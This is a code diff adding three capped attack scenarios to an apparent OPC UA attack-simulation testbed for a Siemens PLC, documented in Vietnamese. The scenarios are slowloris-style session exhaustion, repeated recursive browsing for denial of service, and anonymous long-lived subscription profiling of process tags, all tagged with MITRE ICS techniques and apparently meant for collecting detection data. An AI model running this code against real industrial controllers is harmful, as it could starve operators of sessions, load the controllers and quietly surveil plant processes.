@@ -41,6 +41,8 @@ CONTROLLED_GATED_SCENARIOS = {
     "OPCUA_REPLAY_ATTEMPT",
     "OPCUA_METHOD_CALL_ABUSE",
     "OPCUA_PROTOCOL_FUZZ",
+    "OPCUA_SLOWLORIS",
+    "OPCUA_RECURSIVE_BROWSE",
 }
 MAX_SESSION_BURST_COUNT = 10
 MIN_SESSION_BURST_DELAY_S = 0.2
@@ -50,6 +52,10 @@ DEFAULT_SUBSCRIPTION_HOLD_S = 10.0
 MAX_READ_SCRAPING_COUNT = 500
 MIN_READ_SCRAPING_INTERVAL_S = 0.02
 MAX_FUZZ_FRAME_COUNT = 5
+# Bounded caps for the 3 collection-friendly scenarios (không để hạ PLC thật lâu).
+MAX_SLOWLORIS_SESSIONS = 15
+MAX_RECURSIVE_BROWSE_DEPTH = 5
+MAX_PROFILING_HOLD_S = 300.0
 
 # The default node for write-impact scenarios. Override it only after the
 # writable node has been intentionally confirmed and documented in TIA Portal.
@@ -529,6 +535,159 @@ async def opcua_protocol_fuzz() -> list[str]:
     return evidence
 
 
+async def opcua_slowloris() -> list[str]:
+    """Giữ nhiều phiên OPC UA mở đồng thời (thay vì mở/đóng nhanh như
+    SESSION_BURST) và keepalive bằng một Read vô hại, nhằm chiếm dụng pool
+    phiên của máy chủ để một client hợp lệ nhận BadTooManySessions. Số phiên
+    và thời gian giữ đều bị chặn cứng để không hạ testbed thật lâu dài.
+    MITRE: T0814 Denial of Service (DoS 'im lặng', không tạo packet storm).
+    """
+    from asyncua import Client
+
+    requested = int(os.getenv("DAY8_SLOWLORIS_SESSIONS", "10"))
+    count = max(1, min(requested, MAX_SLOWLORIS_SESSIONS))
+    hold_s = min(float(os.getenv("DAY8_SLOWLORIS_HOLD_S", "40")), 120.0)
+    keepalive_s = max(5.0, float(os.getenv("DAY8_SLOWLORIS_KEEPALIVE_S", "20")))
+    node_id = 'ns=3;s="HienThi"'
+    evidence = [f"configured_sessions={requested}; effective={count}; max={MAX_SLOWLORIS_SESSIONS}; hold_s={hold_s}; keepalive_s={keepalive_s}"]
+
+    clients = []
+    try:
+        for i in range(count):
+            try:
+                c = Client(url=OPC_URL, timeout=10)
+                await c.connect()
+                clients.append(c)
+            except Exception as exc:
+                evidence.append(f"session_{i + 1}: open_failed={type(exc).__name__}: {exc} "
+                                f"(có thể đã chạm giới hạn phiên của máy chủ)")
+                break
+        evidence.append(f"held_sessions={len(clients)}")
+
+        # Trong lúc đang giữ các phiên, thử xem client MỚI còn kết nối được không.
+        try:
+            probe = Client(url=OPC_URL, timeout=5)
+            await probe.connect()
+            await probe.disconnect()
+            evidence.append("new_client_probe: VẪN ĐƯỢC CHẤP NHẬN (chưa cạn pool ở mức này)")
+        except Exception as exc:
+            evidence.append(f"new_client_probe: BỊ TỪ CHỐI={type(exc).__name__}: {exc} (quan sát được hiệu ứng cạn phiên)")
+
+        # Keepalive để giữ phiên không timeout suốt hold_s.
+        t0 = time.time()
+        while time.time() - t0 < hold_s:
+            for c in clients:
+                try:
+                    await c.get_node(node_id).read_value()
+                except Exception:
+                    pass
+            await asyncio.sleep(keepalive_s)
+    except Exception as exc:
+        evidence.append(f"aborted_after_error={type(exc).__name__}: {exc or '(empty message)'}")
+    finally:
+        released = 0
+        for c in clients:
+            try:
+                await c.disconnect()
+                released += 1
+            except Exception:
+                pass
+        evidence.append(f"released {released} sessions")
+    return evidence
+
+
+async def opcua_recursive_browse() -> list[str]:
+    """Duyệt đệ quy address space nhiều lần liên tiếp: một request nhỏ khiến máy
+    chủ phải đi bộ qua cả cây node (asymmetric load).
+
+    TRUNG THỰC: namespace OPC UA của S7-1500 ở đây nhỏ (~9 tag + namespace
+    chuẩn), KHÔNG phải cây vài MB — tải đến từ VIỆC LẶP LẠI, không phải kích
+    thước cây. Depth/số vòng/tần suất đều bị chặn.
+    MITRE: T0814 Denial of Service (asymmetric).
+    """
+    from asyncua import Client
+
+    iters = max(1, min(int(os.getenv("DAY8_RECBROWSE_ITERS", "20")), 100))
+    depth = max(1, min(int(os.getenv("DAY8_RECBROWSE_DEPTH", "4")), MAX_RECURSIVE_BROWSE_DEPTH))
+    interval_s = max(0.2, float(os.getenv("DAY8_RECBROWSE_INTERVAL_S", "0.5")))
+    evidence = [f"iters={iters}; depth={depth}; interval_s={interval_s}"]
+
+    async def walk(node, d, counter):
+        if d <= 0:
+            return
+        try:
+            children = await node.get_children()
+        except Exception:
+            return
+        counter[0] += len(children)
+        for ch in children:
+            await walk(ch, d - 1, counter)
+
+    try:
+        async with Client(url=OPC_URL, timeout=15) as client:
+            t0 = time.time()
+            total_nodes = 0
+            sample_every = max(1, iters // 5)
+            for i in range(iters):
+                counter = [0]
+                await walk(client.nodes.root, depth, counter)
+                total_nodes += counter[0]
+                if i % sample_every == 0:
+                    evidence.append(f"iter_{i + 1}: visited {counter[0]} nodes")
+                await asyncio.sleep(interval_s)
+            elapsed = max(time.time() - t0, 0.001)
+            evidence.append(
+                f"summary: iters={iters} total_nodes_visited={total_nodes} "
+                f"elapsed_s={elapsed:.1f} nodes_per_s={total_nodes / elapsed:.0f}"
+            )
+    except Exception as exc:
+        evidence.append(f"aborted_after_error={type(exc).__name__}: {exc or '(empty message)'}")
+    return evidence
+
+
+async def opcua_behavioral_profiling() -> list[str]:
+    """Một phiên ẩn danh subscribe toàn bộ tag quá trình và theo dõi thay đổi
+    theo thời gian — gián điệp công nghiệp / trinh sát hành vi. 'Dấu hiệu tấn
+    công' là một phiên ẩn danh subscribe DAI DẲNG bất thường so với chu kỳ poll
+    hợp lệ của SCADA. Chỉ đọc, an toàn; thời lượng bị chặn cho lần thu (gián
+    điệp thật sẽ chạy hàng giờ).
+    MITRE: T0801 Monitor Process State.
+    """
+    from asyncua import Client
+
+    hold_s = min(float(os.getenv("DAY8_PROFILING_HOLD_S", "60")), MAX_PROFILING_HOLD_S)
+    nodes = [
+        'ns=3;s="BangTai"', 'ns=3;s="Nhap"', 'ns=3;s="HienThi"',
+        'ns=3;s="Vat 1"', 'ns=3;s="Vat 2"', 'ns=3;s="Vat 3"',
+    ]
+    changes = []
+    evidence = [f"hold_s={hold_s}; nodes={len(nodes)}; model=long-lived anonymous subscription"]
+
+    class Handler:
+        def datachange_notification(self, node, val, data):
+            changes.append((time.time(), str(node.nodeid), val))
+
+    try:
+        async with Client(url=OPC_URL, timeout=int(hold_s) + 15) as client:
+            sub = await client.create_subscription(500, Handler())
+            for nid in nodes:
+                try:
+                    await sub.subscribe_data_change(client.get_node(nid))
+                except Exception as exc:
+                    evidence.append(f"subscribe_failed {nid}: {exc}")
+            await asyncio.sleep(hold_s)
+            await sub.delete()
+        evidence.append(f"observed {len(changes)} value-changes over {hold_s}s from ONE anonymous session")
+        if changes:
+            per_node = {}
+            for _, nid, _ in changes:
+                per_node[nid] = per_node.get(nid, 0) + 1
+            evidence.append(f"change_counts_by_node={per_node}")
+    except Exception as exc:
+        evidence.append(f"aborted_after_error={type(exc).__name__}: {exc or '(empty message)'}")
+    return evidence
+
+
 async def _attempt_write_and_rollback(client, node_id: str, compute_new_value, evidence: list[str]) -> bool:
     """Write compute_new_value(baseline) to node_id, confirm it landed, then always roll back.
 
@@ -668,6 +827,8 @@ async def execute_safe(scenario_id: str) -> list[str] | None:
         return await opcua_read_timing_covert()
     if scenario_id == "OPCUA_READ_SCRAPING":
         return await opcua_read_scraping()
+    if scenario_id == "OPCUA_BEHAVIORAL_PROFILING":
+        return await opcua_behavioral_profiling()
     return None
 
 
@@ -690,6 +851,10 @@ async def execute_controlled_gated(scenario_id: str) -> list[str] | None:
         return await opcua_method_call_abuse()
     if scenario_id == "OPCUA_PROTOCOL_FUZZ":
         return await opcua_protocol_fuzz()
+    if scenario_id == "OPCUA_SLOWLORIS":
+        return await opcua_slowloris()
+    if scenario_id == "OPCUA_RECURSIVE_BROWSE":
+        return await opcua_recursive_browse()
     return None
 
 
